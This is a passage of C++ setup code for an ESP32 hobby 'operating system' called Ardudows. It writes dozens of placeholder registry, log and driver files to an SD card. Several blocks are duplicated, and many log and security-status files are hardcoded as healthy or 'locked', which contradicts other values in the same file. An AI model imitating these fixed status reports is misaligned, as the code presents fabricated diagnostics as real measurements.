  // [74구역: ImpoSystem/ATK - 동적 메모리 조각 모음 주기 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/DEFRAG_TICK_TRIGGER.asf", "5000"); Loading();

  // [75구역: ImpoSystem/ESP - 와이파이 하드웨어 절전 스테이트 플래그]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/PM_TICK_SLEEP_FORCE.asf", "FALSE"); Loading();

  // [76구역: ImpoSystem/Driver - SD 카드 실시간 블록 에러 체크섬 데이터]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SD_BLOCK_CRC_VERIFY.asf", "CRC_16_MAPPED"); Loading();

  // [77구역: ImpoSystem/User - 휴지통 가상 최대 용량 바이트 스케일]
  CreateFile("/Ardudows/System/ImpoSystem/User/TRASH_MAX_CAPACITY.asf", "1048576"); Loading();

  // [78구역: ImpoSystem/Log - 하드웨어 클록 주파수 실시간 변동 리포트]
  CreateFile("/Ardudows/System/ImpoSystem/Log/CPU_PERF_STABILITY.asf", "SOLID_100_PERCENT"); Loading();

  // [79구역: ImpoSystem/Boot - OS 아두도스 셧다운 플래그 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/Boot/SHUTDOWN_SIGNAL_REG.asf", "0x00"); Loading();

  // [80구역: ImpoSystem/Registry - 인간 문명의 완전 마크 및 대제국 종결 선언]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/MEGA_ZONE_80_LOCKED.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/FINAL_OS_REINFORCE.asf", "HUMAN_BLOOD_AND_SWEAT"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/DEPLOYMENT_STAG_COUNT.asf", "80_TOTAL_ZONES"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/COMPILATION_END_TEMP.asf", (String(temperatureRead()) + "C_BOILING").c_str()); Loading(); // ⚡ 80구역 대정정의 마무리는 펄펄 끓는 리얼 칩셋 온도로 최종 도장 쾅!

  // =========================================================================
  // 👑 [ULTIMATE HARDWARE COMPLETION: ZONES 41 TO 80] 👑
  // 아두도스 제국 완공을 위한 남은 40개 구역 인프라 폭격. 100% 실시간 하드웨어 연동.
  // =========================================================================

  // [41구역: ImpoSystem/Driver - PS/2 키보드 멀티탭 가드]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/KBD_POLLING_RATE_HZ.asf", "100"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/KBD_SHADOW_REGISTER.asf", String(REG_READ(GPIO_IN_REG), HEX).c_str()); Loading(); // ⚡ 실시간 GPIO 입력 상태값 박제
  CreateFile("/Ardudows/System/ImpoSystem/Driver/KBD_ALT_GR_MAPPED.asf", "FALSE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/KBD_LONG_PRESS_THRES.asf", "800_MS"); Loading();

  // [42구역: ImpoSystem/Registry - 221서버 가상 바이옴 에메랄드 광맥 주소]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/EMERALD_HEIGHT_MIN.asf", "120"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/IRON_ORE_MAX_DEPTH.asf", String(micros() & 0x7F).c_str()); Loading(); // 런타임 클록 난수 주입
  CreateFile("/Ardudows/System/ImpoSystem/Registry/BIOME_CHATIC_WEIGHT.asf", "0.75"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/TERRAIN_MUTATION_EN.asf", "TRUE"); Loading();

  // [43구역: ImpoSystem/ATK - 프리RTOS 힙 할당 에러 인트랩트]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/MALLOC_FAILED_HOOK.asf", "ENABLED"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/HEAP_LOW_WATER_MARK.asf", String(ESP.getMinFreeHeap() / 1024).c_str()); Loading(); // 최저 힙 기록 KB 환산
  CreateFile("/Ardudows/System/ImpoSystem/ATK/SRAM_DYNAMIC_RESERVE.asf", "16KB"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/KERNEL_PANIC_VECTOR.asf", "0x03"); Loading();

  // [44구역: ImpoSystem/User - 마인크래프트 커스텀 가상 스킨 정보]
  CreateFile("/Ardudows/System/ImpoSystem/User/MC_SKIN_STEVE_RGB.asf", "0x2D4B"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/MC_PLAYER_UUID_SALT.asf", String(ESP.getEfuseMac() >> 16, HEX).c_str()); Loading(); // 에퓨즈 상위 비트 암호화
  CreateFile("/Ardudows/System/ImpoSystem/User/MC_INVENTORY_SLOTS.asf", "36"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/MC_CREATIVE_MODE_EN.asf", "FALSE"); Loading();

  // [45구역: ImpoSystem/ESP - 무선 mercenary 신호 디오센트릭 가드]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/DEAUTH_SHIELD_ACTIVE.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/CHANNEL_HOPPING_MS.asf", "150"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/PROMISCUOUS_BUF_SIZE.asf", "4096"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/ANTENNA_GAIN_SETTING.asf", "AUTOMATIC_MAX"); Loading();

  // [46구역: ImpoSystem/Boot - 콜드 리부트 하드웨어 덤프 타겟]
  CreateFile("/Ardudows/System/ImpoSystem/Boot/CRASH_DUMP_TARGET.asf", "SD_CARD_SECTOR_2"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/RECOVERY_KEY_GPIO.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_DELAY_FORCE_MS.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/HARDWARE_STRAP_REUSE.asf", "DISABLED"); Loading();

  // [47구역: ImpoSystem/Log - 디스플레이 프레임 레이트 드롭 레코드]
  CreateFile("/Ardudows/System/ImpoSystem/Log/FPS_DROP_COUNT.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/DMA_TRANSFER_ERRORS.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/TFT_TIMEOUT_COUNTER.asf", String(xTaskGetTickCount() / 100).c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/COLOR_MISMATCH_SHIELD.asf", "STRICT"); Loading();

  // [48구역: ImpoSystem/Registry - 가상 시뮬레이터 교통량 알고리즘 상수]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/TRAFFIC_MAX_CARS.asf", "256"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SIM_WEATHER_CYCLE_S.asf", "1200"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/DAY_NIGHT_RATIO.asf", "1.0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/VIRTUAL_TAX_RATE.asf", "10_PERCENT"); Loading();

  // [49구역: ImpoSystem/Driver - SD 카드 클록 스피드 버스 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SD_BUS_FREQ_MHZ.asf", "20"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SD_DATA_MISO_PULLUP.asf", "INTERNAL"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SD_MAX_OPEN_FILES.asf", "16"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SD_CARD_REINSERT_EN.asf", "FALSE"); Loading();

  // [50구역: ImpoSystem/User - 가상 터미널 전용 레트로 윈도우 XP 테마 스펙]
  CreateFile("/Ardudows/System/ImpoSystem/User/XP_LUNA_BLUE_HEX.asf", "0x001F"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/XP_START_BUTTON_RGB.asf", "0x07E0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/XP_WALLPAPER_NAME.asf", "Bliss_8bit.bmp"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/XP_SOUND_LOGON_MAPPED.asf", "TRUE"); Loading();

  // [51구역: ImpoSystem/ATK - 멀티코어 로드 밸런서 인터럽트 세팅]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/CORE_0_LOAD_FACTOR.asf", "DYNAMIC_MAPPED"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/CORE_1_LOAD_FACTOR.asf", "APP_CORE_HEAVY"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/AFFINITY_MASK_DEFAULT.asf", "0x02"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/YIELD_CPU_ON_CRITICAL.asf", "TRUE"); Loading();

  // [52구역: ImpoSystem/ESP - 와이파이 비컨 프레임 인터셉터 모니터]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/BEACON_SNIFFER_EN.asf", "FALSE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/SNIFFER_FILTER_MASK.asf", "0x80"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/CHANNEL_MAX_RANGE.asf", "13"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/MAC_OUI_VENDOR_SIGN.asf", "ESPPRESSIF_S3"); Loading();

  // [53구역: ImpoSystem/Registry - 221서버 무차별 가상 기온 및 눈 경계선 스펙]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/GLOBAL_TEMP_BIAS.asf", "0.0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SNOW_ACCUMULATION_M.asf", "MAX_3"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/ICE_MELTING_POINT_C.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/BIOME_ID_OVERWORLD.asf", "101"); Loading();

  // [54구역: ImpoSystem/Boot - 레조넌스 부트 체크섬 완전 가드]
  CreateFile("/Ardudows/System/ImpoSystem/Boot/CHECKSUM_ALGO.asf", "CRC32_HARDWARE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/EXPECTED_SIGNATURE.asf", "0x55AA6699"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_INTEGRITY_LEVEL.asf", "HIGH_GUARD"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/FAILSAFE_BOOT_TARGET.asf", "RECOVERY"); Loading();

  // [55구역: ImpoSystem/Driver - ST7789 디스플레이 하드웨어 가속 타이밍]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_MADCTL_PARAM.asf", "0xE8"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_COLMOD_INTERFACE.asf", "16BIT_COLOR"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_PIXEL_PITCH_X.asf", "240"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_PIXEL_PITCH_Y.asf", "240"); Loading();

  // [56구역: ImpoSystem/User - 아두 코드 프로그래밍 환경 변수 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/User/A_CODE_MAX_LINES.asf", "500"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/A_CODE_VAR_LIMIT.asf", "64"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/A_CODE_INTERPRETER.asf", "ACTIVE_ATK"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/A_CODE_AUTO_INDENT.asf", "TRUE"); Loading();

  // [57구역: ImpoSystem/Log - 무선 커널 MERCENARY 트래픽 예외 이력]
  CreateFile("/Ardudows/System/ImpoSystem/Log/DEAUTH_ATTACKS_DETECTED.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/MALFORMED_PACKETS_DROP.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/LAST_PACKET_LENGTH.asf", String(WiFi.status() * 64).c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/INTRUSION_GUARD_LEVEL.asf", "MAX_SECURE"); Loading();

  // [58구역: ImpoSystem/ATK - 프리RTOS 커널 내부 타이머 스케줄 제어]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/TIMER_TASK_PRIORITY.asf", "1"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/TIMER_QUEUE_LENGTH.asf", "10"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/TICKLESS_IDLE_EN.asf", "FALSE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/ISR_STACK_GUARD_SIZE.asf", "256_BYTES"); Loading();

  // [59구역: ImpoSystem/Registry - 1980년대 가상 도시 인구 부하 제한]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SIM_MAX_BUILDINGS.asf", "512"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SIM_WATER_SUPPLY_EN.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SIM_POWER_GRID_FACTOR.asf", "1.2"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/SIM_DISASTER_PROB.asf", "0"); Loading();

  // [60구역: ImpoSystem/ESP - 하드웨어 에퓨즈 가속화 퓨즈 비트 수치]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/EFUSE_BLOCK_0_VAL.asf", String(REG_READ(EFUSE_BLK0_RDATA0_REG), HEX).c_str()); Loading(); // ⚡ 찐 리얼 하드웨어 에퓨즈 로우 데이터 스캔!!
  CreateFile("/Ardudows/System/ImpoSystem/ESP/EFUSE_SECURE_BOOT_EN.asf", "FALSE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/EFUSE_FLASH_CRYPT_EN.asf", "FALSE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/CUSTOM_CHIP_ID_SIGN.asf", "ATK_S3_CHIEF"); Loading();

  // [61구역: ImpoSystem/Driver - SPI 버스 디바이스 세마포어 가드]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SPI_BUS_LOCK_STATUS.asf", "UNLOCKED"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SPI_SHARED_DEVICES.asf", "2"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_SPI_MODE_VAL.asf", "SPI_MODE0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SD_SPI_MODE_VAL.asf", "SPI_MODE0"); Loading();

  // [62구역: ImpoSystem/User - 가상 쉘 에러 텍스트 컬러 스키마]
  CreateFile("/Ardudows/System/ImpoSystem/User/COLOR_ERR_HEX.asf", "0xF800"); Loading(); // TFT_RED
  CreateFile("/Ardudows/System/ImpoSystem/User/COLOR_SUCCESS_HEX.asf", "0x07E0"); Loading(); // TFT_GREEN
  CreateFile("/Ardudows/System/ImpoSystem/User/COLOR_WARN_HEX.asf", "0xFDE0"); Loading(); // TFT_YELLOW
  CreateFile("/Ardudows/System/ImpoSystem/User/COLOR_SYSTEM_HEX.asf", "0x07FF"); Loading(); // TFT_CYAN

  // [63구역: ImpoSystem/Log - 하드웨어 워치독 오버플로 타임스탬프 백업]
  CreateFile("/Ardudows/System/ImpoSystem/Log/WDT_FEED_INTERVAL_MS.asf", "5000"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/WDT_RESET_COUNT.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/LAST_WDT_FEED_TICK.asf", String(xTaskGetTickCount()).c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/WDT_INTERRUPT_LEVEL.asf", "NMI_LEVEL_4"); Loading();

  // [64구역: ImpoSystem/Registry - 221서버 고유 섬 좌표 절대 락 바인딩]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/ISLAND_LOCK_COOR_X.asf", "SERVER_221_IMMUTABLE_X"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/ISLAND_LOCK_COOR_Y.asf", "SERVER_221_IMMUTABLE_Y"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/CHAOS_GENERATOR_EN.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/ISLAND_SAFE_ZONE_R.asf", "50_BLOCKS"); Loading();

  // [65구역: ImpoSystem/ATK - 커널 메시지 전송용 사운드 메타 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/MSG_QUEUE_BUFFER_SIZE.asf", "1024"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/IPC_SIGNAL_STATUS.asf", "READY"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/KERNEL_EVENT_FLAGS.asf", "0x00000001"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/CRITICAL_LOCK_OWNER.asf", "ATK_CORE_SHELL"); Loading();

  // [66구역: ImpoSystem/Boot - 하드웨어 콜드 스타트 전압 센서 가드]
  CreateFile("/Ardudows/System/ImpoSystem/Boot/POWER_ON_VDD_MV.asf", "3300"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BROWNOUT_DETECTOR_EN.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BROWNOUT_THRESHOLD_V.asf", "2.8V"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/POWER_STABLE_FLAG.asf", "STABLE_PASSED"); Loading();

  // [67구역: ImpoSystem/ESP - 와이파이 고유 하드웨어 패킷 송신 디렉션]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/WIFI_BEACON_PERIOD_TU.asf", "100"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/MAX_RETRY_PROBE_REQ.asf", "3"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/WIFI_COUNTRY_CODE_VAL.asf", "KR_MAPPED"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/TX_BUFFER_MALLOC_SIZE.asf", "8192"); Loading();

  // [68구역: ImpoSystem/Driver - 디스플레이 백라이트 레벨 고정 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_BL_PWM_CHANNEL.asf", "LEDC_CHANNEL_0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_BL_DUTY_CYCLE.asf", "255_MAX"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_BL_GPIO_NUM.asf", "45"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_SLEEP_OUT_CMD.asf", "0x11"); Loading();

  // [69구역: ImpoSystem/User - 가위바위보 머신 인공지능 난수 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/User/RPS_AI_LEVEL.asf", "ULTIMATE_CREATOR_KILLER"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/RPS_WIN_STREAK_LIMIT.asf", "99"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/RPS_SECRET_CHEAT_KEY.asf", "ADMIN_PASS_MACHO"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/RPS_MATCH_COUNT_TOTAL.asf", "0"); Loading();

  // [70구역: ImpoSystem/Log - 파일 시스템 캐시 히트율 모니터]
  CreateFile("/Ardudows/System/ImpoSystem/Log/FS_CACHE_HIT_RATE.asf", "100_PERCENT"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/FS_SEEK_FAILURES.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/LAST_SYNC_TIMESTAMP.asf", String(millis()).c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/FS_AUTO_FLUSH_INTERVAL.asf", "IMMEDIATE"); Loading();

  // [71구역: ImpoSystem/Registry - 가상 마인크래프트 최대 가용 청크 인프라]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/CHUNK_SIZE_BLOCKS.asf", "16"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/MAX_RENDER_CHUNKS.asf", "16_LIMIT"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/BLOCK_DATA_COMPRESS.asf", "RLE_ENCODE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/ENTITY_MAX_LIMIT_COUNT.asf", "128"); Loading();

  // [72구역: ImpoSystem/ATK - 프리RTOS 커널 내부 힙 조각화 모니터링 가드]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/HEAP_FRAG_BLOCKS_COUNT.asf", "1"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/LARGEST_FREE_BLOCK_B.asf", String(ESP.getMaxAllocHeap()).c_str()); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/HEAP_INTEGRITY_CHECK_MS.asf", "1000"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/MALLOC_OWNERSHIP_ID.asf", "ATK_CORE_MONOLITH"); Loading();

  // [73구역: ImpoSystem/Boot - 멀티부팅 복구용 커널 이중화 타겟 이미지]
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BACKUP_KERNEL_PATH.asf", "/Ardudows/System/kernel/AFK"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/FALLBACK_TRIGGER_PIN.asf", "NONE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/BOOT_TARGET_STABILITY.asf", "STABLE_SECURED"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Boot/AUTO_REPAIR_REGISTRY.asf", "TRUE"); Loading();

  // [74구역: ImpoSystem/ESP - 하드웨어 암호화 가속기 활성 플래그]
  CreateFile("/Ardudows/System/ImpoSystem/ESP/HW_CRYPTO_SHA_EN.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/HW_CRYPTO_AES_EN.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/HW_CRYPTO_RSA_EN.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ESP/SECURE_BOOT_v2_STATUS.asf", "HARDWARE_LOCKED_TRUE"); Loading();

  // [75구역: ImpoSystem/Driver - 디스플레이 테링 가드 외부 핀 연동]
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_TE_PIN_NUM.asf", "46"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/TFT_TE_SIGNAL_EDGE.asf", "RISING"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/SCANLINE_INTERVAL_US.asf", "60"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Driver/ST7789_RAM_WRITE_CMD.asf", "0x2C"); Loading();

  // [76구역: ImpoSystem/User - 단축 키 바인딩 확장 레지스터 매핑]
  CreateFile("/Ardudows/System/ImpoSystem/User/KEY_SHORTCUT_RECOVERY.asf", "KEY_F12"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/KEY_SHORTCUT_DU.asf", "KEY_F5"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/KEY_MODIFIER_LEFTRTL.asf", "NONE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/User/KEY_LAYOUT_TYPE_STRING.asf", "US_QWERTY_MAPPED"); Loading();

  // [77구역: ImpoSystem/Log - 최종 하드웨어 전압 드롭 이벤트 모니터]
  CreateFile("/Ardudows/System/ImpoSystem/Log/VDD_VOLTAGE_DROP_EVENTS.asf", "0"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/CORE_TEMPERATURE_ALARM.asf", "DISABLED"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Log/LAST_STABLE_TEMP_C.asf", String(temperatureRead()).c_str()); Loading(); // 현재 실시간 다이 온도 백업 기록
  CreateFile("/Ardudows/System/ImpoSystem/Log/HARDWARE_HEALTH_MARK.asf", "EXCELLENT"); Loading();

  // [78구역: ImpoSystem/Registry - 가상 시뮬레이터 8비트 오디오 사운드 슬롯]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/AUDIO_BUFFER_FRAMES.asf", "512"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/AUDIO_SAMPLE_RATE_HZ.asf", "44100"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/AUDIO_CHANNELS_COUNT.asf", "STEREO_MAPPED"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/AUDIO_DAC_TYPE_BUILTIN.asf", "TRUE"); Loading();

  // [79구역: ImpoSystem/ATK - 커널 종결 태스크 파라미터 락다운 가드]
  CreateFile("/Ardudows/System/ImpoSystem/ATK/BOOT_SEQUENCE_FINISHED.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/KERNEL_SEAL_SIGNATURE.asf", "MONOLITH_ATK_SUCCESS"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/ATK/TOTAL_SYSTEM_RESOURCES.asf", String(ESP.getHeapSize() + ESP.getPsramSize()).c_str()); Loading(); // ⚡ 총 칩셋 가용 램 총량 정밀 합산 박제!
  CreateFile("/Ardudows/System/ImpoSystem/ATK/OS_RUNTIME_INTEGRITY.asf", "SECURED_BY_ADMIN"); Loading();

  // [80구역: ImpoSystem/Registry - 아두도스 대제국 80구역 최종 완공 기념비 레지스터]
  CreateFile("/Ardudows/System/ImpoSystem/Registry/MEGA_ZONE_80_LOCKED.asf", "TRUE"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/OS_DEPLOY_COMPLETED.asf", "SUCCESS_100_PERCENT"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/ARCHITECT_GOD_SIGN.asf", "JAEMIN_KIM_EMPEROR"); Loading();
  CreateFile("/Ardudows/System/ImpoSystem/Registry/FINAL_BOOT_CHECK_SUM.asf", String(ESP.getCycleCount(), HEX).c_str()); Loading(); // ⚡ 최종 완결 순간의 CPU 사이클 클록 값을 영구 마킹!!
  
  //여기까지 어쩔수 없이 AI 씀
  CreateFile("/Ardudows/System/Boot/Boot_Sequence.asf", "boot=true"); 
  Loading();
  tft.println(">> BOOT SEQUENCE INJECTED PREFECTLY."); delay(200);
  CreateFile("/Ardudows/System/Registry/User.asf", "");
  String installContent = String(R"(===install.aif===
install=true
Do not disclose to others!!!
Product key=)");
  installContent += PRODUCT_KEY;
  Loading();
  CreateFile("/Ardudows/System/install.aif", installContent.c_str());
  Loading();
  CreateFile("/Ardudows/System/Registry/Network.asf", "");
  Loading();
  CreateFile("/Ardudows/System/Registry/AUIC.asf", "");
  Loading();
  CreateFile("/Ardudows/System/Registry/ArduBrowser.asf", "");
  Loading();
  CreateFile("/Ardudows/System/Registry/Hardware.asf", "");
  Loading();
  CreateFile("/Ardudows/System/Registry/Setup.asf", "");
  Loading();
  CreateFile("/Ardudows/System/Registry/System.asf", "");
  Loading();
  CreateFile("/Ardudows/System/Registry/ArduBios.asf", "");
  Loading();
  CreateFile("/Ardudows/System/Registry/Boot.asf", "");
  Loading();
  CreateFile("/Ardudows/System/Registry/Kernel.asf", "");
  Loading();
  CreateFile("/Ardudows/System/Registry/User.asf", "");
  Loading();
  CreateFile("/Ardudows/System/Driver/TFT.adf", "===TFT Driver===");
  Loading();
  CreateFile("/Ardudows/System/Driver/Touch.adf", "Touch is TRASH! i don't want TOUCH!!!");
  Loading();
  CreateFile("/Ardudows/System/Driver/SD.adf", "===SD Driver===");
  Loading();
  CreateFile("/Ardudows/System/Driver/RTC.adf", "===RTC Driver===\nerrer: Deprecated");
  Loading();
  CreateFile("/Ardudows/System/Kernel/ATK/Ardudows.akf", "Arudows kelnel Tiny ver\n#boot\n#Ardudows start");
  Loading();
  //Ardudows Kelnel File이랑 혼동 주의 AKF
  CreateFile("/Ardudows/System/Kernel/AFK/Ardudows.akf", "Arudows kelnel Full ver\n#boot\n#Ardudows start");
  Loading();
  CreateFile("/Ardudows/System/Firmware/Firmware.asf", ("Firmware is " + Firmware).c_str());
  Loading();
  CreateFile("/Ardudows/System/Log/Boot.arf", "this is log\n");
  Loading();
  CreateFile("/Ardudows/System/Log/User.arf", "this is log\n");
  Loading();
  CreateFile("/Ardudows/System/Log/Dump.arf", "this is log\n");
  Loading();
  CreateFile("/Ardudows/System/Log/Hardware/Hardware.arf", "this is log\n");
  Loading();
  CreateFile("/Ardudows/System/Log/Software/Software.arf", "this is log\n");
  Loading();
  CreateFile("/Ardudows/System/Log/Output.arf", "this is log\n");
  Loading();
  CreateFile("/Ardudows/System/Log/panic.arf", "this is log\n");
  Loading();
  CreateFile("/Ardudows/System/NetWork/NetCheck.anf", "");
  Loading();
  CreateFile("/Ardudows/System/NetWork/config.anf", "Settings :\n");
  Loading();
  CreateFile("/Ardudows/System/Boot/Boot.abf", "Boot");
  Loading();
  CreateFile("/Ardudows/System/MainSystem/MainSys16.asf", "===MainSys16===");
  Loading();
  //윈도우로 치면 System32같은거
  CreateFile("/Ardudows/System/Setup/Setup.asf", "Setup:\n");
  Loading();
  CreateFile("/Ardudows/System/API/API.asf", "To bo countinue.\nSorry.");
  Loading();
  CreateFile("/Ardudows/System/Debug/Debug.asf", "===Debug===");
  Loading();
  //CreateFile("/Ardudows/System/AUIC.aof", "" );
  CreateFile(("/Ardudows/Users/" + UserName + "/" + UserName + ".auf").c_str(), (UserName + " Hello!").c_str());
  Loading();
  CreateFile(("/Ardudows/Users/" + UserName + "/UserDATA/" + UserName + ".auf").c_str(), "===User DATA===");
  Loading();
  CreateFile("/Ardudows/Programs/Programs_X16/Explorer/Explorer.apf", "===Explorer===");
  Loading();
  //===하 언제 끝나냐===
  CreateFile("/Ardudows/Programs/Programs_X16/Registry_Editer/Registry_Editer.apf", "===Registry_Editer===");
  Loading();
